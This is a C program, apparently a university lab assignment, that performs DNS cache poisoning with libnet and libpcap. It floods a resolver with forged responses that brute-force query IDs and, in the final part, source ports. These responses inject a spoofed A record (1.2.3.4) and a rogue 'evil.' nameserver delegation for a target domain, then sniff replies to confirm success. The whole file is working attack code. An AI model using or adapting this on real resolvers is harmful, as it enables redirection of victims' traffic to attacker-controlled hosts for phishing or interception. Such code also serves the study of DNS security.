#include <assert.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <stdint.h>
#include <time.h>
#include <stdlib.h>
#include <pcap.h>

#include <netinet/ether.h>
#include <netinet/ip.h>

#define ETHERNET_HEADER_LENGTH 14
#define UDP_HEADER_LENGTH 8
#define DNS_HEADER_LENGTH 12

#include "attack.h"

void 						destroyLibnetContext(struct Libnet libnet);
uint16_t 					formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options);
uint16_t 					formatDNSAnswer(struct DNSAnswerRecordFormatOptions options);
uint32_t 					makeByteNumberedIP(struct Libnet libnet, char* name, int resolve);
struct Libnet 				makeLibnet();
libnet_ptag_t 				makeIPHeader(struct IPv4HeaderOptions options);
libnet_ptag_t 				makeUDPHeader(struct UDPHeaderOptions options);
libnet_ptag_t 				makeDNSHeader(struct DNSHeaderOptions options);
struct BaseRequestHeaders	makeDNSRequestHeaders(struct DNSRequestHeadersOptions options);
struct DNSQueryRequest 		makeDNSQueryRequest(struct StringBaseRequestOptions options);
struct QuestionRecord 	makeDNSQuestionRecord(struct DNSQuestionRecordOptions options);
struct DNSAnswerRecord 		makeDNSAnswerRecord(struct DNSAnswerRecordOptions options);
struct DNSAnswerRequest 	makeDNSAnswerRequest(struct StringBaseRequestOptions options);
struct DNSAuthRequest makeDNSAnswerAuthRequest(struct StringBaseRequestOptions options);
struct DNSAnswerRecord makeDNSAuthRecord(struct DNSAnswerRecordOptions options);
uint16_t formatDNSAuth(struct DNSAnswerRecordFormatOptions options);
void obtainOtherDomainNames();

// Copy from netinet/udp.h due to weird anonymous union
struct Udphdr
{
	uint16_t source;
	uint16_t dest;
	uint16_t len;
	uint16_t check;
};

struct Dnshdr {
	uint16_t id;
	uint16_t opcode;
	uint16_t questionCount;
	uint16_t answerCount;
	uint16_t authorityCount;
	uint16_t additionalRecordCount;
};

struct DnsQuestion {
	uchar_t qname[64];
	uchar_t qtype[2];
	uchar_t qclass[2];
};

struct DnsAnswer {
	uchar_t type[2];
	uchar_t class[2];
	uchar_t ttl[4];
	uchar_t rdlength[2];
	uchar_t rdata[32];

};

struct Headers {
	struct ethhdr* ether;
	struct iphdr* ip;
	struct Udphdr* udp;
	struct Dnshdr* dns;
};

int successes = 0;
struct Pcap {
	char* errorBuffer;
	pcap_t* handle;
	bpf_u_int32 netMask;
	bpf_u_int32 deviceIP;

};

struct Packet {
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	const uchar_t* contents;		/* The actual packet */
};

struct Pcap makePcap() {
	struct Pcap pcap;
	char* interface = "enp0s8";
	struct bpf_program filterExpression;
	char filterExpressionString[] = "udp and src host 192.168.10.10";

	pcap.errorBuffer = calloc(1, PCAP_ERRBUF_SIZE);

	if (pcap_lookupnet(interface, &(pcap.deviceIP), &(pcap.netMask), pcap.errorBuffer) == -1) {
		fprintf(stderr, "Can't get netmask for interface %s\n", interface);
		exit(EXIT_FAILURE);
	}

	pcap.handle = pcap_open_live(interface, BUFSIZ, 1, 1000, pcap.errorBuffer);
	if (pcap.handle == NULL) {
		fprintf(stderr, "Cant open interface enp0s8: %s\n", pcap.errorBuffer);
		exit(EXIT_FAILURE);
	}

	if (pcap_compile(pcap.handle, &filterExpression, filterExpressionString, 0, pcap.deviceIP) == -1) {
		fprintf(stderr, "Error: couldn't create filter %s: %s\n", filterExpressionString, pcap_geterr(pcap.handle));
		exit(EXIT_FAILURE);
	}
	if (pcap_setfilter(pcap.handle, &filterExpression) == -1) {
		fprintf(stderr, "Couldn't add filter '%s' to pcap handle: %s\n", filterExpressionString, pcap_geterr(pcap.handle));
		exit(EXIT_FAILURE);
	}

	return pcap;
}

void destroyPcap(struct Pcap pcap) {
	free(pcap.errorBuffer);
	pcap_close(pcap.handle);
}

struct DnsAnswer parseResolverPacket(struct Packet packet) {
	uint16_t length = ETHERNET_HEADER_LENGTH;
	struct Headers headers;
	struct DnsQuestion question;
	struct DnsAnswer answer;

	headers.ether = (struct ethhdr*)packet.contents;
	headers.ip = (struct iphdr*)(packet.contents + length);
	length += (headers.ip->ihl * 4);
	headers.udp = (struct Udphdr*)(packet.contents + length);
	length += UDP_HEADER_LENGTH;
	headers.dns = (struct Dnshdr*)(packet.contents + length);
	length += DNS_HEADER_LENGTH;

	// Copy question
	strcpy(question.qname, packet.contents + length);
	length += strlen(question.qname) + sizeof(uchar_t);
	memcpy(question.qtype, (packet.contents + length), sizeof question.qtype);
	length += 2 * sizeof(uchar_t);
	memcpy(question.qclass, (packet.contents + length), sizeof question.qclass);
	length += 4 * sizeof(uchar_t);

	// Copy answer
	memcpy(answer.type, (packet.contents + length), sizeof answer.type);
	length += 2 * sizeof(uchar_t);
	memcpy(answer.class, (packet.contents + length), sizeof answer.class);
	length += 2 * sizeof(uchar_t);
	memcpy(answer.ttl, (packet.contents + length), sizeof answer.ttl);
	length += 4 * sizeof(uchar_t);
	memcpy(answer.rdlength, (packet.contents + length), sizeof answer.rdlength);
	length += 2 * sizeof(uchar_t);
	strcpy(answer.rdata, packet.contents + length);
	length += strlen(answer.rdata) + sizeof(uchar_t);
	return answer;
}

struct Packet sniffPacket(struct Pcap pcap) {
	struct Packet packet;
	packet.contents = pcap_next(pcap.handle, &(packet.header));

	return packet;
}

uint16_t checkSuccess(struct Packet packet, char* pattern) {
	const struct DnsAnswer answer = parseResolverPacket(packet);

	uint16_t isMatch = 0;
	if (strstr(answer.rdata, pattern) == NULL) {
		return 0;
	}
	successes += 1;
	return 1;
}

void printSpoofedIp(uchar_t* qname, char* pattern, struct Packet packet) {
	printf("%s ", qname);
	struct DnsAnswer answer = parseResolverPacket(packet);
	char* spoofed = strstr(answer.rdata, pattern);
	for (int i = 0; i < 4; i++) {
		printf("%d", *(uint16_t*)spoofed & 0xFF);
		if (i + 1 != 4) {
			printf(".");
		}
		spoofed += 1;
	}
	printf("\n");
}

void partOne(uint16_t resolverPort, uint16_t qid) {
	struct Pcap pcap = makePcap();
	struct BaseRequestOptions baseRequestOptions;
	struct StringBaseRequestOptions query;

	char* qname = { "abominable.vu.nl" };

	baseRequestOptions.queryID = 1200;
	baseRequestOptions.sourcePort = 17012;
	baseRequestOptions.destinationPort = 53;
	query.qname = qname;
	query.sourceIP = "192.168.10.20";
	query.destinationIP = "192.168.10.10";
	query.base = baseRequestOptions;
	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
	query.sourceIP = "192.168.10.30";
	query.base.destinationPort = resolverPort;
	query.base.sourcePort = 53;
	query.base.queryID = qid;
	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(query);
	uint16_t end = 100;
	for (int i = 0; i < end; i++) {
		libnet_write(queryRequest.base.libnet.context);
		for (int j = 0; j < 20; j++) {
			libnet_write(answerRequest.base.libnet.context);
		}
	}
	struct Packet packet = sniffPacket(pcap);
	checkSuccess(packet, "\001\002\003\004");
	if (successes) {
		printSpoofedIp(qname, "\001\002\003\004", packet);
		destroyLibnetContext(queryRequest.base.libnet);
		destroyLibnetContext(answerRequest.base.libnet);
		destroyPcap(pcap);
	}
	return;
}

void partTwo(uint16_t resolverPort, uint16_t qidStart, uint16_t qidEnd) {
	char* qname = { "missing.vu.nl" };
	struct Pcap pcap = makePcap();
	struct BaseRequestOptions baseRequestOptions;
	struct StringBaseRequestOptions query;
	baseRequestOptions.queryID = 1200;
	baseRequestOptions.sourcePort = 17012;
	baseRequestOptions.destinationPort = 53;
	query.qname = qname;
	query.sourceIP = "192.168.10.20";
	query.destinationIP = "192.168.10.10";
	query.base = baseRequestOptions;
	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
	query.sourceIP = "192.168.10.30";
	query.base.destinationPort = resolverPort /*12100*/;
	query.base.sourcePort = 53;
	struct DNSAnswerRequest answerRequest = makeDNSAnswerRequest(query);
	// uint16_t qidEnd = 65535;
	// uint16_t qidBeginnning = 200;
	for (int i = 0; i < 10000; i++) {
		for (int j = 0; j < 100; j++) {
			libnet_write(queryRequest.base.libnet.context);
			for (int j = 0; j < 20; j++) {
				answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidStart)) + qidStart;
				answerRequest.dnsHeaderOptions.ptag = answerRequest.base.headers.DNSHeaderPtag;
				makeDNSHeader(answerRequest.dnsHeaderOptions);
				libnet_write(answerRequest.base.libnet.context);
			}
		}
		struct Packet packet = sniffPacket(pcap);
		checkSuccess(packet, "\001\002\003\004");
		if (successes > 10) {
			printSpoofedIp(qname, "\001\002\003\004", packet);
			destroyLibnetContext(queryRequest.base.libnet);
			destroyLibnetContext(answerRequest.base.libnet);
			destroyPcap(pcap);
			break;
		}
	}
	return;
}

void partThree(uint16_t resolverPort, uint16_t qidStart, uint16_t qidEnd, char * domain) {

	char qname[64] = { "bad." };
	strcat(qname, domain);

	struct Pcap pcap = makePcap();
	struct BaseRequestOptions baseRequestOptions;
	struct StringBaseRequestOptions query;
	uint16_t success = 0;
	baseRequestOptions.queryID = 1200;
	baseRequestOptions.sourcePort = 17012;
	baseRequestOptions.destinationPort = 53;
	query.qname = qname;
	query.sourceIP = "192.168.10.20";
	query.destinationIP = "192.168.10.10";
	query.base = baseRequestOptions;
	query.domain = domain;
	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
	query.sourceIP = "192.168.10.30";
	query.base.queryID = 300; // Test
	query.base.destinationPort = resolverPort;
	query.base.sourcePort = 53;
	struct DNSAuthRequest authRequest = makeDNSAnswerAuthRequest(query);
	// uint16_t qidEnd = 65535;
	// uint16_t qidStart = 200;
	for (int i = 0; i < 15000; i++) {
		for (int j = 0; j < 100; j++) {
			libnet_write(queryRequest.base.libnet.context);
			for (int j = 0; j < 20; j++) {
				authRequest.answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidStart)) + qidStart;
				authRequest.answerRequest.dnsHeaderOptions.ptag = authRequest.answerRequest.base.headers.DNSHeaderPtag;
				makeDNSHeader(authRequest.answerRequest.dnsHeaderOptions);
				uint16_t c = libnet_write(authRequest.answerRequest.base.libnet.context);
				if (c == -1)
				{
					fprintf(stderr, "Write error: %s\n", libnet_geterror(authRequest.answerRequest.base.libnet.context));
				}
			}
		}
		struct Packet packet = sniffPacket(pcap);
		checkSuccess(packet, "\001\002\003\004");
		if (successes > 10) {
			printSpoofedIp(qname, "\001\002\003\004", packet);
			destroyLibnetContext(queryRequest.base.libnet);
			destroyLibnetContext(authRequest.answerRequest.base.libnet);
			destroyPcap(pcap);
			obtainOtherDomainNames(domain);
			break;
		}
	}
	return;
}

void obtainOtherDomainNames(char * domain) {
	struct Pcap pcap = makePcap();

	struct BaseRequestOptions testBaseRequestOptions;
	struct StringBaseRequestOptions testQueryOptions;
	struct Packet packet;
	char domainstoCheck[2][64] = {"rickroll.", "dancedancerevolution."};
	for(int i = 0; i < 2; i++){
		strcat(domainstoCheck[i], domain);
	}
	testQueryOptions.qname= domainstoCheck[0];
	testBaseRequestOptions.queryID = 1200;
	testBaseRequestOptions.sourcePort = 17012;
	testBaseRequestOptions.destinationPort = 53;
	testQueryOptions.sourceIP = "192.168.10.20";
	testQueryOptions.destinationIP = "192.168.10.10";
	testQueryOptions.base = testBaseRequestOptions;
	struct DNSQueryRequest testQueryRequest = makeDNSQueryRequest(testQueryOptions);

	char* patterns[2] = { "\b\004\002\001", "\001\002\003\004" };

	while (1) {
		libnet_write(testQueryRequest.base.libnet.context);
		packet = sniffPacket(pcap);
		if (checkSuccess(packet, patterns[0])) {
			printSpoofedIp(testQueryOptions.qname, patterns[0], packet);
			break;
		}
	}

	testQueryOptions.qname= domainstoCheck[1];
	testQueryRequest = makeDNSQueryRequest(testQueryOptions);
	libnet_write(testQueryRequest.base.libnet.context);
	while (1) {
		libnet_write(testQueryRequest.base.libnet.context);
		packet = sniffPacket(pcap);
		if (checkSuccess(packet, patterns[0])) {
			printSpoofedIp(testQueryOptions.qname, patterns[0], packet);
			break;
		}
		packet = sniffPacket(pcap);
	}
	destroyPcap(pcap);
	destroyLibnetContext(testQueryRequest.base.libnet);
	return;
};

void partFour(int16_t portStart, uint16_t qidStart, uint16_t qidEnd, char * domain, uint16_t portEnd) {
	char qname[64] = "evil.";
	strcat(qname, domain);
	struct BaseRequestOptions baseRequestOptions;
	struct StringBaseRequestOptions query;
	struct Pcap pcap = makePcap();

	baseRequestOptions.queryID = 1200;
	baseRequestOptions.sourcePort = 17012;
	baseRequestOptions.destinationPort = 53;
	query.qname = qname;
	query.sourceIP = "192.168.10.20";
	query.destinationIP = "192.168.10.10";
	query.base = baseRequestOptions;
	query.domain = domain;
	struct DNSQueryRequest queryRequest = makeDNSQueryRequest(query);
	query.sourceIP = "192.168.10.30";
	query.base.queryID = 300; // Test
	query.base.destinationPort = 12000;
	query.base.sourcePort = 53;
	struct DNSAuthRequest authRequest = makeDNSAnswerAuthRequest(query);
	for (int i = 0; i < 15000; i++) {
		for (int j = 0; j < 100; j++) {
			libnet_write(queryRequest.base.libnet.context);
			for (int j = 0; j < 20; j++) {
				authRequest.answerRequest.dnsHeaderOptions.queryID = (rand() % (qidEnd - qidStart)) + qidStart;
				authRequest.answerRequest.dnsHeaderOptions.ptag = authRequest.answerRequest.base.headers.DNSHeaderPtag;
				makeDNSHeader(authRequest.answerRequest.dnsHeaderOptions);
				authRequest.answerRequest.udpHeaderOptions.base.destinationPort = (rand() % (portEnd - portStart)) + portStart;
				authRequest.answerRequest.udpHeaderOptions.ptag = authRequest.answerRequest.base.headers.UDPHeaderPtag;
				makeUDPHeader(authRequest.answerRequest.udpHeaderOptions);
				uint16_t c = libnet_write(authRequest.answerRequest.base.libnet.context);
				if (c == -1)
				{
					fprintf(stderr, "Write error: %s\n", libnet_geterror(authRequest.answerRequest.base.libnet.context));
				}
			}
		}
		struct Packet packet = sniffPacket(pcap);
		checkSuccess(packet, "\001\002\003\004");
		checkSuccess(packet, "\b\004\002\001");
		if (successes > 10) {
			printSpoofedIp(qname, "\001\002\003\004", packet);
			destroyLibnetContext(queryRequest.base.libnet);
			destroyLibnetContext(authRequest.answerRequest.base.libnet);
			destroyPcap(pcap);
			obtainOtherDomainNames(domain);
			break;
		}
	}
	return;
}

int main(int argc, char* argv[]) {

	srand(time(NULL));
	short part = parseOptions(argc, argv);
	errno = 0;
	char * tailPtr = NULL;
	char* arguments[6];
	uint16_t argNum = 0;

	if (argv[optind] == NULL || argv[optind + 1] == NULL) {
		printf("Missing argument(s)\n");
		exit(EXIT_FAILURE);
	}

	for (;optind < argc; optind += 1, argNum += 1) {
		arguments[argNum] = argv[optind];
	}

	uint16_t portStart, qidStart, qidEnd, portEnd;
	char * domain;
	portStart = (uint16_t)strtol(arguments[0], &tailPtr, 10);
	switch (part)
	{
	case 1:;
		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
		if (errno) {
			printf("Invalid argument(s)\n");
			exit(EXIT_FAILURE);
		}
		partOne(portStart, qidStart);
		break;
	case 2:;
		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
		qidEnd = (uint16_t)strtol(arguments[2], &tailPtr, 10);
		if (errno) {
			printf("Invalid argument(s)\n");
			exit(EXIT_FAILURE);
		}
		partTwo(portStart, qidStart, qidEnd);
		break;
	case 3:;
		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
		qidEnd = (uint16_t)strtol(arguments[2], &tailPtr, 10);
		domain = arguments[3];
		if (errno) {
			printf("Invalid argument(s)\n");
			exit(EXIT_FAILURE);
		}
		partThree(portStart, qidStart, qidEnd, domain);
		break;
	case 4:
		qidStart = (uint16_t)strtol(arguments[1], &tailPtr, 10);
		qidEnd = (uint16_t)strtol(arguments[2], &tailPtr, 10);
		domain = arguments[3];
		portEnd = (uint16_t)strtol(arguments[4], &tailPtr, 10);
		partFour(portStart, qidStart, qidEnd, domain, portEnd);
		break;
	default:
		break;
	}
}

struct DNSAnswerRecord makeDNSAnswerRecord(struct DNSAnswerRecordOptions options) {

	struct DNSAnswerRecord record;
	char answerBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	struct DNSAnswerRecordFormatOptions answerFormatOptions = { options.libnet, answerBuffer, options };
	record.recordSize = formatDNSAnswer(answerFormatOptions);
	record.ptag = libnet_build_data(
		(uint8_t*)answerBuffer,
		(uint32_t)record.recordSize,
		options.libnet.context,
		options.ptag
	);
	if (record.ptag == -1) {
		fprintf(stderr, "Error: Could not create Answer Record.\n Libnet error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return record;

};

struct DNSAnswerRecord makeDNSAuthRecord(struct DNSAnswerRecordOptions options) {

	struct DNSAnswerRecord record;
	char answerBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	struct DNSAnswerRecordFormatOptions answerFormatOptions = { options.libnet, answerBuffer, options };
	record.recordSize = formatDNSAuth(answerFormatOptions);
	record.ptag = libnet_build_data(
		(uint8_t*)answerBuffer,
		(uint32_t)record.recordSize,
		options.libnet.context,
		options.ptag
	);
	if (record.ptag == -1) {
		fprintf(stderr, "Error: Could not create Answer Record.\n Libnet error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return record;

};

uint16_t formatDNSAuth(struct DNSAnswerRecordFormatOptions options) {
	uint16_t recordLength = 0;
	char rdataBuffer[64] = { '\0' };
	char Type[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Type, uint16tono16(options.answer.type));
	char Class[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Class, uint16tono16(options.answer.class));
	char TTL[sizeof(uint32_t)] = { '\0' }; uint32ToChars(TTL, uint32tono32(options.answer.ttl));
	uint16_t rdLength = makeDomain(rdataBuffer, options.answer.rdata);
	char RDLENGTH[sizeof(uint16_t)] = { '\0' }; uint16ToChars(RDLENGTH, uint16tono16(rdLength));

	recordLength = makeDomain(options.buffer, options.answer.qname);
	memcpy(options.buffer + recordLength, &Type, sizeof Type);
	recordLength += sizeof Type;
	memcpy(options.buffer + recordLength, &Class, sizeof Class);
	recordLength += sizeof Class;
	memcpy(options.buffer + recordLength, &TTL, sizeof TTL);
	recordLength += sizeof TTL;
	memcpy(options.buffer + recordLength, &RDLENGTH, sizeof RDLENGTH);
	recordLength += sizeof RDLENGTH;
	memcpy(options.buffer + recordLength, rdataBuffer, sizeof rdataBuffer);
	recordLength += rdLength;

	return recordLength;
}

uint16_t formatDNSAnswer(struct DNSAnswerRecordFormatOptions options) {
	uint16_t recordLength = 0;
	char Type[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Type, uint16tono16(options.answer.type));
	char Class[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Class, uint16tono16(options.answer.class));
	char TTL[sizeof(uint32_t)] = { '\0' }; uint32ToChars(TTL, uint32tono32(options.answer.ttl));
	char RDLENGTH[sizeof(uint16_t)] = { '\0' }; uint16ToChars(RDLENGTH, uint16tono16(options.answer.rdlength));
	char rdataBuffer[sizeof(uint32_t)] = { '\0' };
	uint32_t noRdata = libnet_name2addr4(options.libnet.context, options.answer.rdata, LIBNET_DONT_RESOLVE);
	uint32ToChars(rdataBuffer, noRdata);

	recordLength = makeDomain(options.buffer, options.answer.qname);
	memcpy(options.buffer + recordLength, &Type, sizeof Type);
	recordLength += sizeof Type;
	memcpy(options.buffer + recordLength, &Class, sizeof Class);
	recordLength += sizeof Class;
	memcpy(options.buffer + recordLength, &TTL, sizeof TTL);
	recordLength += sizeof TTL;
	memcpy(options.buffer + recordLength, &RDLENGTH, sizeof RDLENGTH);
	recordLength += sizeof RDLENGTH;
	memcpy(options.buffer + recordLength, rdataBuffer, sizeof rdataBuffer);
	recordLength += sizeof rdataBuffer;

	return recordLength;
}

libnet_ptag_t makeDNSHeader(struct DNSHeaderOptions options) {
	libnet_ptag_t PTAG = 0;
	PTAG = libnet_build_dnsv4(
		LIBNET_UDP_DNSV4_H,
		options.queryID,
		options.flags,
		options.numberQuestions,
		options.numberAnswerResourceRecords,
		options.authorityResourceRecord,
		options.additionalRecords,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		options.ptag
	);
	if (PTAG == -1) {
		fprintf(stderr, "Error: Could not create DNS header. \nLibnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return PTAG;
}

struct BaseRequestHeaders makeDNSRequestHeaders(struct DNSRequestHeadersOptions options) {

	struct BaseRequestHeaders headerPtags;
	headerPtags.DNSHeaderPtag = makeDNSHeader(options.dnsHeader);
	headerPtags.UDPHeaderPtag = makeUDPHeader(options.udpHeader);
	headerPtags.IPv4HeaderPtag = makeIPHeader(options.ipHeader);
	return headerPtags;
}



struct NetworkOrderedIPs parseIPs(struct Libnet libnet, char* sourceIPString, char* destinationIPString) {
	struct NetworkOrderedIPs ips;
	if (sourceIPString == NULL) {
		ips.source = libnet_get_ipaddr4(libnet.context);
	}
	else {
		ips.source = makeByteNumberedIP(libnet, sourceIPString, LIBNET_DONT_RESOLVE);
	}

	ips.destination = makeByteNumberedIP(libnet, destinationIPString, LIBNET_DONT_RESOLVE);
	return ips;
}

struct DNSAuthRequest makeDNSAnswerAuthRequest(struct StringBaseRequestOptions options) {

	char* spoofedIp = "1.2.3.4";
	char evilNameServer[128] = {"evil."};
	strcat(evilNameServer, options.domain);

	struct DNSAuthRequest authRequest;
	struct DNSAnswerRecord domainRecordRequest[3], nameServerRecord;
	struct DNSRequestHeadersOptions requestHeadersOptions;
	requestHeadersOptions.recordsSize = 0;
	struct DNSAnswerRecordOptions answerRecordOptions, authRecordOptions, nameserverRecordOptions;

	authRequest.answerRequest.base.libnet = makeLibnet();
	options.base.networkOrderedIPs = parseIPs(authRequest.answerRequest.base.libnet, options.sourceIP, options.destinationIP);

	nameserverRecordOptions.qname = evilNameServer;
	nameserverRecordOptions.type = 1;
	nameserverRecordOptions.class = 1;
	nameserverRecordOptions.ttl = 7200;
	nameserverRecordOptions.rdlength = 4; // Need to change
	nameserverRecordOptions.rdata = "192.168.10.20";
	nameserverRecordOptions.ptag = 0;
	nameserverRecordOptions.libnet = authRequest.answerRequest.base.libnet;
	nameServerRecord = makeDNSAnswerRecord(nameserverRecordOptions);
	requestHeadersOptions.recordsSize += nameServerRecord.recordSize;

	authRecordOptions.qname = options.domain;
	authRecordOptions.type = 2;
	authRecordOptions.class = 1;
	authRecordOptions.ttl = 7200;
	authRecordOptions.rdlength = strlen(evilNameServer) + 1; //Length
	authRecordOptions.rdata = evilNameServer;
	authRecordOptions.ptag = 0;
	authRecordOptions.libnet = authRequest.answerRequest.base.libnet;
	authRequest.domainRecord = makeDNSAuthRecord(authRecordOptions);
	requestHeadersOptions.recordsSize += authRequest.domainRecord.recordSize;

	answerRecordOptions.qname = options.qname;
	answerRecordOptions.type = 1;
	answerRecordOptions.class = 1;
	answerRecordOptions.ttl = 7200;
	answerRecordOptions.rdlength = 4;
	answerRecordOptions.rdata = spoofedIp;
	answerRecordOptions.ptag = 0;
	answerRecordOptions.libnet = authRequest.answerRequest.base.libnet;
	authRequest.answerRequest.answerRecord = makeDNSAnswerRecord(answerRecordOptions);
	requestHeadersOptions.recordsSize += authRequest.answerRequest.answerRecord.recordSize;


	uint16_t qtype = 1, qclass = 1;
	struct DNSQuestionFormatOptions dnsQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions questionRecordOptions = { authRequest.answerRequest.base.libnet, dnsQuestionFormatOptions, 0 };
	authRequest.answerRequest.questionRecord = makeDNSQuestionRecord(questionRecordOptions);
	requestHeadersOptions.recordsSize += authRequest.answerRequest.questionRecord.questionSize;

	requestHeadersOptions.libnet = authRequest.answerRequest.base.libnet;
	requestHeadersOptions.base = options.base;

	struct DNSHeaderOptions dnsHeaderOptions = { authRequest.answerRequest.base.libnet, requestHeadersOptions.recordsSize, options.base.queryID , 0b1000010000000000, 1, 1, 1, 1,0 };
	struct UDPHeaderOptions udpHeaderOptions = { authRequest.answerRequest.base.libnet, requestHeadersOptions.recordsSize, options.base, 0 };
	struct IPv4HeaderOptions ipHeaderOptions = { authRequest.answerRequest.base.libnet, requestHeadersOptions.recordsSize, options.base };

	requestHeadersOptions.dnsHeader = dnsHeaderOptions;
	requestHeadersOptions.udpHeader = udpHeaderOptions;
	requestHeadersOptions.ipHeader = ipHeaderOptions;

	authRequest.answerRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	authRequest.answerRequest.dnsHeaderOptions = dnsHeaderOptions;
	authRequest.answerRequest.answerRecordOptions = answerRecordOptions;
	authRequest.answerRequest.questionRecordOptions = questionRecordOptions;
	authRequest.answerRequest.udpHeaderOptions = udpHeaderOptions;
	return authRequest;
}

struct DNSAnswerRequest makeDNSAnswerRequest(struct StringBaseRequestOptions options) {

	struct DNSAnswerRequest answerRequest;
	answerRequest.base.libnet = makeLibnet();
	options.base.networkOrderedIPs = parseIPs(answerRequest.base.libnet, options.sourceIP, options.destinationIP);

	struct DNSAnswerRecordOptions answerRecordOptions;
	answerRecordOptions.qname = options.qname;
	answerRecordOptions.type = 1;
	answerRecordOptions.class = 1;
	answerRecordOptions.ttl = 7200;
	answerRecordOptions.rdlength = 4;
	answerRecordOptions.rdata = "1.2.3.4";
	answerRecordOptions.ptag = 0;
	answerRecordOptions.libnet = answerRequest.base.libnet;
	answerRequest.answerRecord = makeDNSAnswerRecord(answerRecordOptions);

	uint16_t qtype = 1, qclass = 1;
	struct DNSQuestionFormatOptions dnsQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions questionRecordOptions = { answerRequest.base.libnet, dnsQuestionFormatOptions, 0 };
	answerRequest.questionRecord = makeDNSQuestionRecord(questionRecordOptions);

	struct DNSRequestHeadersOptions requestHeadersOptions;
	requestHeadersOptions.libnet = answerRequest.base.libnet;
	requestHeadersOptions.base = options.base;
	requestHeadersOptions.recordsSize = answerRequest.questionRecord.questionSize + answerRequest.answerRecord.recordSize;

	struct DNSHeaderOptions dnsHeaderOptions = { answerRequest.base.libnet, requestHeadersOptions.recordsSize, options.base.queryID , 0b1000010000000000, 1, 1, 0, 0,0 };
	struct UDPHeaderOptions udpHeaderOptions = { answerRequest.base.libnet, requestHeadersOptions.recordsSize, options.base, 0 };
	struct IPv4HeaderOptions ipHeaderOptions = { answerRequest.base.libnet, requestHeadersOptions.recordsSize, options.base };

	requestHeadersOptions.dnsHeader = dnsHeaderOptions;
	requestHeadersOptions.udpHeader = udpHeaderOptions;
	requestHeadersOptions.ipHeader = ipHeaderOptions;

	answerRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	answerRequest.dnsHeaderOptions = dnsHeaderOptions;
	answerRequest.udpHeaderOptions = udpHeaderOptions;
	answerRequest.answerRecordOptions = answerRecordOptions;
	answerRequest.questionRecordOptions = questionRecordOptions;
	return answerRequest;
}

struct DNSQueryRequest makeDNSQueryRequest(struct StringBaseRequestOptions options) {

	struct DNSQueryRequest queryRequest;
	queryRequest.base.libnet = makeLibnet();
	uint16_t qtype = 1, qclass = 1;

	options.base.networkOrderedIPs = parseIPs(queryRequest.base.libnet, options.sourceIP, options.destinationIP);

	struct DNSQuestionFormatOptions dnsQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions questionRecordOptions = { queryRequest.base.libnet, dnsQuestionFormatOptions, 0 };
	queryRequest.questionRecord = makeDNSQuestionRecord(questionRecordOptions);

	struct DNSRequestHeadersOptions requestHeadersOptions;
	struct DNSHeaderOptions dnsHeaderOptions = { queryRequest.base.libnet, queryRequest.questionRecord.questionSize, options.base.queryID , 0b100000000, 1, 0, 0,0,0 };
	struct UDPHeaderOptions udpHeaderOptions = { queryRequest.base.libnet, queryRequest.questionRecord.questionSize, options.base, 0 };
	struct IPv4HeaderOptions ipHeaderOptions = { queryRequest.base.libnet, queryRequest.questionRecord.questionSize, options.base };

	requestHeadersOptions.libnet = queryRequest.base.libnet;
	requestHeadersOptions.base = options.base;
	requestHeadersOptions.recordsSize = queryRequest.questionRecord.questionSize;
	requestHeadersOptions.dnsHeader = dnsHeaderOptions;
	requestHeadersOptions.udpHeader = udpHeaderOptions;
	requestHeadersOptions.ipHeader = ipHeaderOptions;

	queryRequest.questionRecordOptions = questionRecordOptions;
	queryRequest.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	return queryRequest;
}

uint32_t makeByteNumberedIP(struct Libnet libnet, char* name, int resolve) {
	uint32_t byteOrderedIp;
	if ((byteOrderedIp = libnet_name2addr4(libnet.context, name, resolve)) == -1) {
		fprintf(stderr, "Error: Bad destination IP address.\n");
		exit(EXIT_FAILURE);
	}
	return byteOrderedIp;
}

uint16_t formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options) {

	uint16_t questionSize = makeDomain(DNSQuestionBuffer, options.qname);
	char qtypeChar[2] = { '0' }; uint16ToChars(qtypeChar, uint16tono16(options.qtype));
	char qclassChar[2] = { '0' }; uint16ToChars(qclassChar, uint16tono16(options.qclass));;

	memcpy(DNSQuestionBuffer + questionSize, &qtypeChar, sizeof qtypeChar);
	questionSize += sizeof qtypeChar;
	memcpy(DNSQuestionBuffer + questionSize, &qclassChar, sizeof qclassChar);
	questionSize += sizeof qclassChar;
	return questionSize;

}

struct QuestionRecord makeDNSQuestionRecord(struct DNSQuestionRecordOptions options) {
	char questionBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	uint16_t questionSize = formatDNSQuestion(questionBuffer, options.formatOptions);
	libnet_ptag_t ptag = libnet_build_data(
		(uint8_t*)questionBuffer,
		questionSize,
		options.libnet.context,
		options.ptag
	);
	if (ptag == -1) {
		fprintf(stderr, "Error could not create DNS question record..\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return (struct QuestionRecord) { ptag, questionSize };
}
